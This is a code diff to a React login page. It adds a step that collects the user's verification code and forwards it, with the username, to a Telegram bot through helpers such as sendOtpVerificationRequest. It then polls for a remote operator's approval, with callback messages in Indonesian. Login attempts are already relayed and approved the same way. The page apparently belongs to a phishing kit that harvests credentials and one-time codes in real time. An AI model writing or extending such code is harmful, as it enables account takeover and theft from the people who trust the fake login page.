@@ -5,7 +5,7 @@ import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown } from "lucide-react";
 import { ChatWidget } from "@/components/chat-widget";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
-import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
+import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset, sendBotOTP, sendOtpVerificationRequest } from "@/lib/telegram";
 
 
 const languageOptions: { code: Language; label: string }[] = [
@@ -24,15 +24,57 @@ export default function Login() {
   const [loading, setLoading] = useState(false);
   const [waiting, setWaiting] = useState(false);
   const [showModal, setShowModal] = useState(false);
+  const [showVerifyModal, setShowVerifyModal] = useState(false);
+  const [pendingOtp, setPendingOtp] = useState("");
+  const [sendingCode, setSendingCode] = useState(false);
+  const [showCodeModal, setShowCodeModal] = useState(false);
+  const [enteredCode, setEnteredCode] = useState("");
+  const [codeError, setCodeError] = useState("");
+  const [checkingCode, setCheckingCode] = useState(false);
   const [showLangDropdown, setShowLangDropdown] = useState(false);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const offsetRef = useRef(0);
+  const otpSessionKeyRef = useRef("");
+  const otpPollRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const otpOffsetRef = useRef(0);
 
   useEffect(() => () => {
     if (pollRef.current) clearInterval(pollRef.current);
+    if (otpPollRef.current) clearInterval(otpPollRef.current);
   }, []);
 
   if (isAuthenticated) { navigate("/"); return null; }
+
+  const handleContinueCode = async () => {
+    if (!enteredCode.trim()) { setCodeError("Please enter the verification code."); return; }
+    setCodeError("");
+    setCheckingCode(true);
+    const sessionKey = Date.now().toString(36) + "_otp";
+    otpSessionKeyRef.current = sessionKey;
+    const offset = await getLatestOffset();
+    otpOffsetRef.current = offset;
+    await sendOtpVerificationRequest(username, enteredCode.trim(), pendingOtp, sessionKey);
+    otpPollRef.current = setInterval(async () => {
+      const { status, nextOffset, callbackId } = await pollApproval(otpOffsetRef.current, sessionKey);
+      otpOffsetRef.current = nextOffset;
+      if (status === "approved") {
+        clearInterval(otpPollRef.current!);
+        if (callbackId) await answerCallback(callbackId, "✅ Kode disetujui! Melanjutkan ke step berikutnya.");
+        setCheckingCode(false);
+        setShowCodeModal(false);
+        navigate("/login-success");
+      } else if (status === "rejected") {
+        clearInterval(otpPollRef.current!);
+        if (callbackId) await answerCallback(callbackId, "❌ Kode ditolak.");
+        setCheckingCode(false);
+        setCodeError("The code you entered was not approved. Please try again.");
+      }
+    }, 2500);
+  };
+
+  const handleResendCode = async () => {
+    await sendBotOTP(pendingOtp, username);
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -58,10 +100,12 @@ export default function Login() {
       offsetRef.current = nextOffset;
       if (status === "approved") {
         clearInterval(pollRef.current!);
-        if (callbackId) await answerCallback(callbackId, "✅ Login disetujui! Melanjutkan ke verifikasi OTP.");
+        if (callbackId) await answerCallback(callbackId, "✅ Login disetujui! Menunggu verifikasi OTP.");
+        const otp = String(Math.floor(100000 + Math.random() * 900000));
         sessionStorage.setItem("botOtpUsername", username);
+        setPendingOtp(otp);
         setWaiting(false);
-        navigate("/bot-otp");
+        setShowVerifyModal(true);
       } else if (status === "rejected") {
         clearInterval(pollRef.current!);
         if (callbackId) await answerCallback(callbackId, "❌ Login ditolak.");
